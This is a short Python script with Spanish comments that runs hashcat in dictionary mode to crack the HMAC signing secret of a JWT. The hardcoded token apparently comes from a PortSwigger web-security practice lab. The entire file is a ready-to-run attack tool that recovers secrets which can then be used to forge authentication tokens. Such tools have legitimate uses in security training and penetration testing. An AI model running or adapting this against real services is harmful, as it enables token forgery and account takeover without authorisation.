#!/usr/bin/env python3
"""
Crackea el secreto de un JWT firmado con HMAC (HS256/384/512) usando hashcat.
Pega tu JWT en la variable JWT y ejecuta:  python crack_jwt.py
"""

import os
import subprocess
import sys

# ==========================================================
#  PEGA AQUI TU JWT
# ==========================================================
JWT = "eyJraWQiOiJmMTgzYWEyNS0yMGI5LTRiZWQtOGU0YS1kNmEyMzc5NDJiZTQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjkxNDkzOCwic3ViIjoid2llbmVyIn0.28uJ9_nmDMTEB2JRlku5w0CBDYkUszFixp9ClAO8LYU"
# ==========================================================

# Rutas relativas a este script
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
HASHCAT = os.path.join(BASE_DIR, "hashcat-7.1.2", "hashcat.exe")
WORDLIST = os.path.join(BASE_DIR, "jwt.secrets.list")

# hashcat -a 0 (ataque por diccionario)  -m 16500 (JWT / HMAC)
MODE = "16500"
ATTACK = "0"


def main():
    jwt = JWT.strip()

    if not jwt or "xxxxx" in jwt:
        sys.exit("[!] Pega un JWT valido en la variable JWT dentro del script.")

    if jwt.count(".") != 2:
        sys.exit("[!] El JWT no tiene el formato correcto (header.payload.signature).")

    for path, name in ((HASHCAT, "hashcat.exe"), (WORDLIST, "jwt.secrets.list")):
        if not os.path.isfile(path):
            sys.exit(f"[!] No se encontro {name} en: {path}")

    cmd = [HASHCAT, "-a", ATTACK, "-m", MODE, jwt, WORDLIST]

    print("[*] Ejecutando:")
    print("    " + " ".join(cmd))
    print("-" * 60)

    # Ejecuta hashcat mostrando su salida en tiempo real
    result = subprocess.run(cmd, cwd=os.path.join(BASE_DIR, "hashcat-7.1.2"))

    print("-" * 60)
    if result.returncode == 0:
        print("[+] hashcat termino. Si encontro el secreto se muestra arriba.")
        print("[*] Para ver el secreto crackeado tambien puedes usar:")
        print(f'    "{HASHCAT}" -m {MODE} "{jwt}" --show')
    else:
        print(f"[!] hashcat termino con codigo {result.returncode} "
              "(exhausted = secreto no esta en la lista).")


if __name__ == "__main__":
    main()
